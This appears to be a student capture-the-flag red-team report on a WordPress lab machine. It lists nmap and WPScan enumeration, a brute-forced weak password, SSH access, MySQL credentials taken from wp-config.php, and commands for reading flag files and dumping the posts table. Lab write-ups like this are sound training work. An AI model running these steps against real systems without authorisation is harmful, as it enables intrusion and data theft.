*Red Team: Summary of Operations*

**Table of Contents**
Exposed Services


Critical Vulnerabilities

Exploitation

Exposed Services

*Nmap scan results for each machine reveal the below services and OS details:*

Command: **nmap -sV 192.168.1.110**

Output Screenshot: (IN RED TEAM FOLDER)

*Critical Vulnerabilities*

The following vulnerabilities were identified on each target:

1.**Open Ports**

2.**Wordpress**

3.**Weak User Password**

4.**Privilege Escalation**

*Explotation*

Penetrated Target 1 and retrieve the following confidential data:



*Exploit Used:*
 
**WPScan to enumerate users of the Target 1 WordPress site**

Command: 
**$ wpscan --url http://192.168.1.110 --enumerate u**


*Targeting user Michael*

1.Brute Force attack to find Michael’s password

2.User password was weak and easy to guess

**Password: michael**

Capturing Flag 1: 
**SSH as Michael went through directories and files.**

*Flag 1:* 

Commands:

1. ssh michael@192.168.1.110

2. cd var/www/html*

3. ls -la

4. cat service.html
 (Screenshot in Folder)


**Exploit Used:**


While logged in as user Michael Flag 2 was also found.

Searching through directories and files Flag 2 was found in /var/www 

Commands:

1. cd var/www

2. ls -la

3. cat flag2.txt


Flag 2 (screenshot in folder)


**Exploit Used:**

**Accessing MySQL database.**
With finding wp-config.php and gaining access to the database credentials as Michael, MySQL was used.

*Flag 3 & 4 was found in wp_posts table in the wordpress database.*

*Commands:*

**mysql --user root --password**
**(password) R@venSecurity**

**use wordpress;**

**show tables;**

**select * from wp_posts;**

Flag 3 & 4 (Screenshot in folder)
